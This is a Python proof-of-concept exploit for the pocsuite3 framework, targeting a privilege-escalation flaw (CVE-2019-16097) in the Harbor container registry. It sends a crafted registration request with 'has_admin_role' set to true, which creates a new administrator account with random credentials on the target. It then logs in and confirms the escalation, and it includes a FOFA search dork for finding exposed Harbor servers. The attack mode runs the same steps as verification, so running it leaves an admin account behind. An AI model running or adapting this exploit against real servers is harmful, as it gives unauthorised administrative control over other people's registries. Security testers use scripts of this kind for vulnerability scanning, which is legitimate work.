#!/usr/bin/env python
# coding: utf-8
from pocsuite3.api import (POCBase, Output, logger, VUL_TYPE,
                           POC_CATEGORY, requests, register_poc, random_str)
import string
import json


class TestPOC(POCBase):
    vulID = '98073'
    version = '1.0'
    author = 'luckybool1020'+'lzx'
    vulDate = "/"  # 漏洞公开的时间,不知道就写今天
    createDate = "2019-11-14"  # 编写 PoC 的日期
    updateDate = "2023-7-28"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/5l1v3r1/CVE-2019-16101"]  # 漏洞地址来源,0day不用写
    name = "Harbor 提权"  # PoC 名称
    appPowerLink = "https://goharbor.io//"  # 漏洞厂商主页地址
    appName = "harbor"  # 漏洞应用名称
    appVersion = "/"  # 漏洞影响版本
    vulType = VUL_TYPE.PRIVILEGE_ESCALATION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    dork = {'fofa': 'app="HARBOR"'}
    desc = """
            Harbor 中的严重漏洞可将权限从零升级到管理员,CVE-2019-16097
        """  # 漏洞简要描述


    def get_pass(self, harbor_session):
        random_user = ''.join(random_str(8, string.ascii_letters + string.digits))
        random_password = ''.join(random_str(8, string.ascii_letters + string.digits))
        payload = '{{"username":"{random_user}","email":"{random_user}@user.com","realname":"{random_user}","password":"1Q{random_password}","comment":"1","has_admin_role":true}}'.format(
            random_user=random_user, random_password=random_password)
        header = {
            "Content-Type": "application/json",
            "Accept": "application/json"}
        url_acc = self.url+'/api/users'
        harbor_session.post(url_acc, data=payload, headers=header, timeout=10)

        url_login = self.url + '/c/login'
        header = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"}
        payload_login = 'principal={random_user}&password=1Q{random_password}'.format(
            random_user=random_user, random_password=random_password)
        harbor_session.post(url_login, data=payload_login, headers=header)
        return random_user

    def _verify(self):
        result = {}
        harbor_session = requests.session()
        username = self.get_pass(harbor_session)
        url = self.url+ '/api/users'
        header = {
            "Content-Type": "application/json",
            "Accept": "application/json"}
        content = harbor_session.get(url, headers=header).content
        for item in json.loads(content):
            if item['username'] == username and item['has_admin_role']:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                return self.parse_output(result)
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
